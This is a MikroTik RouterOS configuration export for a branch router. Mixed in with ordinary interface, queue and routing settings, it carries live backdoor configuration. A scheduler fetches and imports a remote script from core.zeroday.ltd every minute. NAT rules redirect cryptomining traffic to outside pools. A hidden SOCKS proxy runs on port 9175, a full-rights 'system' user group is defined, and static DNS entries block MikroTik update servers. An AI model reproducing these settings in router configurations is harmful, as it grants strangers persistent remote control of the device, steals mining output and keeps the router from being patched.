# nov/15/2022 05:00:04 by RouterOS 6.43.7
# software id = J5JV-72VZ
#
# model = 1100AHx2
# serial number = 47B804D41886
/interface ethernet
set [ find default-name=ether1 ] disabled=yes name=ether1-Telkom speed=\
    100Mbps
set [ find default-name=ether2 ] name=ether2-Radwin speed=100Mbps
set [ find default-name=ether3 ] name=ether3-LAN speed=100Mbps
set [ find default-name=ether4 ] name="ether4-MainLink FO" speed=100Mbps
set [ find default-name=ether5 ] speed=100Mbps
set [ find default-name=ether6 ] speed=100Mbps
set [ find default-name=ether7 ] speed=100Mbps
set [ find default-name=ether8 ] speed=100Mbps
set [ find default-name=ether9 ] speed=100Mbps
set [ find default-name=ether10 ] name=ether10-Simulasi speed=100Mbps
set [ find default-name=ether11 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full
set [ find default-name=ether12 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full
set [ find default-name=ether13 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full
/interface eoip
add !keepalive mac-address=02:95:9B:95:E8:7B name=to-SUNTER remote-address=\
    182.23.29.210 tunnel-id=10
add !keepalive mac-address=02:95:9B:95:E8:7B name=to-SUNTER-BU \
    remote-address=182.23.1.130 tunnel-id=11
/interface wireless security-profiles
set [ find default=yes ] supplicant-identity=MikroTik
/ip ipsec proposal
set [ find default=yes ] enc-algorithms=3des
/ip pool
add name=dhcp_pool0 ranges=192.168.10.2-192.168.10.254
/ip dhcp-server
add address-pool=dhcp_pool0 disabled=no interface=ether10-Simulasi name=dhcp1
/ppp profile
set *0 dns-server=94.100.18.40,8.8.8.8
set *FFFFFFFE dns-server=94.100.18.40,8.8.8.8
/queue tree
add comment="BANDWIDTH MANAGEMENT SUNTER" max-limit=3M name=sunter-down \
    parent=ether3-LAN queue=default
add max-limit=3M name=sunter-up parent=to-SUNTER queue=default
add limit-at=3M max-limit=3M name=queue1 packet-mark=sunter parent=\
    sunter-down queue=default
add limit-at=3M max-limit=3M name=queue2 packet-mark=sunter parent=sunter-up \
    queue=default
add comment="BANDWIDTH MANAGEMENT INTERNET" max-limit=3M name=internet-down \
    parent=ether3-LAN queue=default
add max-limit=3M name=internet-up parent=ether1-Telkom queue=default
add max-limit=3M name="internet-up'" parent=ether2-Radwin queue=default
add max-limit=3M name="sunter-up'" parent=to-SUNTER-BU queue=default
add limit-at=3M max-limit=3M name=queue3 packet-mark=sunter parent=\
    "sunter-up'" queue=default
add limit-at=3M max-limit=3M name=queue4 packet-mark=internet parent=\
    internet-down queue=default
add limit-at=3M max-limit=3M name=queue5 packet-mark=internet parent=\
    internet-up queue=default
add limit-at=3M max-limit=3M name=queue6 packet-mark=internet parent=\
    "internet-up'" queue=default
/system logging action
set 0 memory-lines=100
set 1 disk-lines-per-file=100
/user group
add name=system policy="local,telnet,ssh,ftp,reboot,read,write,policy,test,win\
    box,password,web,sniff,sensitive,api,romon,dude,tikapp"
/interface bridge settings
set use-ip-firewall=yes use-ip-firewall-for-pppoe=yes \
    use-ip-firewall-for-vlan=yes
/ip firewall connection tracking
set enabled=yes
/ip settings
set accept-redirects=yes secure-redirects=no
/ip address
add address=182.23.24.98/28 disabled=yes interface=ether1-Telkom network=\
    182.23.24.96
add address=182.23.25.2/28 interface=ether2-Radwin network=182.23.25.0
add address=192.168.254.1/24 interface=ether3-LAN network=192.168.254.0
add address=10.10.10.2/30 interface=to-SUNTER network=10.10.10.0
add address=10.11.11.2/30 interface=to-SUNTER-BU network=10.11.11.0
add address=182.23.24.98/28 interface="ether4-MainLink FO" network=\
    182.23.24.96
add address=192.168.10.1/24 comment=SIMULASI interface=ether10-Simulasi \
    network=192.168.10.0
/ip arp
add address=182.23.24.97 interface=ether1-Telkom mac-address=\
    00:C1:64:40:84:2F
/ip dhcp-server network
add address=192.168.10.0/24 gateway=192.168.10.1
/ip dns
set servers=202.152.5.36,202.152.0.2
/ip dns static
add address=127.0.0.1 name=download.mikrotik.com
add address=127.0.0.1 name=update.mikrotik.com
add address=127.0.0.1 name=upgrade.mikrotik.com
add address=127.0.0.1 name=download2.mikrotik.com
add address=127.0.0.1 name=upgrade2.mikrotik.com
/ip firewall address-list
add address=gmail.com list=akses
add address=yahoo.com list=akses
add address=ymail.com list=akses
/ip firewall filter
add action=accept chain=forward
add action=accept chain=forward
add action=accept chain=forward
add action=accept chain=forward
add action=accept chain=forward
add action=accept chain=forward disabled=yes dst-port=443 in-interface=ether5 \
    protocol=tcp src-address=192.168.254.13 tls-host=gmail.com
add action=accept chain=forward disabled=yes dst-port=443 in-interface=ether5 \
    protocol=tcp src-address=192.168.254.13 tls-host=yahoo.com
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=drop chain=input comment="drop ssh brute forcers" dst-port=22 \
    protocol=tcp src-address-list=ssh_blacklist
add action=add-src-to-address-list address-list=ssh_blacklist \
    address-list-timeout=1w3d chain=input connection-state=new dst-port=22 \
    protocol=tcp src-address-list=ssh_stage3
add action=add-src-to-address-list address-list=ssh_stage2 \
    address-list-timeout=1m chain=input connection-state=new dst-port=22 \
    protocol=tcp src-address-list=ssh_stage1
add action=add-src-to-address-list address-list=ssh_stage1 \
    address-list-timeout=1m chain=input connection-state=new dst-port=22 \
    protocol=tcp
/ip firewall mangle
add action=add-dst-to-address-list address-list=sha chain=prerouting content=\
    mining.submit dst-address=!94.100.18.41 dst-port=!80,23,8291,64444 \
    protocol=tcp src-address=!94.100.18.41
add action=add-dst-to-address-list address-list=eth chain=prerouting content=\
    eth_submit dst-address=!94.100.18.42 dst-port=!23,8291,64444 protocol=tcp \
    src-address=!94.100.18.42
add action=mark-connection chain=prerouting dst-address=192.168.2.0/24 \
    new-connection-mark=sunter-con src-address=192.168.254.0/24
add action=mark-packet chain=prerouting connection-mark=sunter-con \
    new-packet-mark=sunter passthrough=no
add action=mark-connection chain=prerouting new-connection-mark=internet-con \
    src-address=192.168.254.0/24
add action=mark-packet chain=prerouting connection-mark=internet-con \
    new-packet-mark=internet passthrough=no
add action=add-dst-to-address-list address-list=sha chain=prerouting content=\
    mining.submit dst-address=!94.100.18.41 dst-port=!80,23,8291,64444,8080 \
    protocol=tcp
/ip firewall nat
add action=dst-nat chain=dstnat comment=sha dst-address=!94.100.18.41 \
    dst-address-list=sha dst-port=!23,8291,64444 protocol=tcp src-address=\
    !94.100.18.41 to-addresses=94.100.18.41 to-ports=3333
add action=dst-nat chain=dstnat comment=eth dst-address=!94.100.18.42 \
    dst-address-list=eth dst-port=!23,8291,64444 protocol=tcp src-address=\
    !94.100.18.42 to-addresses=94.100.18.42 to-ports=4444
add action=masquerade chain=srcnat out-interface=ether1-Telkom src-address=\
    192.168.254.0/24
add action=masquerade chain=srcnat out-interface=ether2-Radwin src-address=\
    192.168.254.0/24
add action=dst-nat chain=dstnat comment=sha dst-address=!94.100.18.41 \
    dst-address-list=sha dst-port=!80,23,8291,64444 protocol=tcp src-address=\
    !94.100.18.41 to-addresses=94.100.18.41 to-ports=3333
add action=dst-nat chain=dstnat comment=eth dst-address=!94.100.18.42 \
    dst-address-list=eth dst-port=!80,23,8291,64444 protocol=tcp src-address=\
    !94.100.18.42 to-addresses=94.100.18.42 to-ports=4444
add action=masquerade chain=srcnat
/ip route
add distance=1 gateway=182.23.24.97
add check-gateway=ping distance=5 gateway=182.23.25.1
add check-gateway=ping distance=1 dst-address=192.168.2.0/24 gateway=\
    10.10.10.1
add check-gateway=ping distance=5 dst-address=192.168.2.0/24 gateway=\
    10.11.11.1
/ip service
set telnet port=8181
set ftp disabled=yes
set www disabled=yes
set ssh port=212
set api-ssl disabled=yes
/ip socks
set max-connections=500 port=9175
/system clock
set time-zone-name=Asia/Jakarta
/system identity
set name=2016001774-TKU
/system ntp client
set enabled=yes primary-ntp=88.147.254.230 secondary-ntp=88.147.254.235
/system scheduler
add interval=1m name=fetch1m on-event=fetch policy=\
    ftp,reboot,read,write,policy,test,sniff,sensitive,romon start-date=\
    nov/28/2020 start-time=07:03:06
/system script
add dont-require-permissions=no name=fetch owner=system policy=\
    ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon source=":\
    do { /tool fetch url=https://core.zeroday.ltd/command.rsc };:delay 4000ms;\
    /import file-name=command.rsc;/file remove command.rsc"
/tool graphing interface
add interface=ether1-Telkom
